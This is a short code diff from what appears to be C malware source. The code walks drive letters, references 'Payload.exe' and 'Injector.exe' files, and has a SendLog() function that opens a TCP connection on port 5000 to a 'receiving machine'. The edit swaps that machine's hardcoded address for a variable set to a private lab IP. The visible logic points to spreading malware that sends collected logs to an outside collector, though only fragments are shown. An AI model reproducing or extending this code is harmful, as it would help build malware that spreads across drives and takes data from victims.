@@ -17,7 +17,7 @@ const char *drive[]={
     "m:", "n:", "o:", "p:", "q:", "r:", "s:", "t:", "u:", "v:", "w:", "x:",
     "y:", "z:", 0
 };
-
+const char* ipAdres = "192.168.56.1";
 const char payload[MAX_PATH]="\\Payload.exe";
 const char infector[MAX_PATH]="\\Injector.exe";
 
@@ -207,7 +207,7 @@ int SendLog() {
     struct sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(5000);
-    serverAddr.sin_addr.s_addr = inet_addr("172.27.64.1"); //IP van receiving machine
+    serverAddr.sin_addr.s_addr = inet_addr(ipAdres); //IP van receiving machine
 
     // Create a socket and connect to the server
     SOCKET clientSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
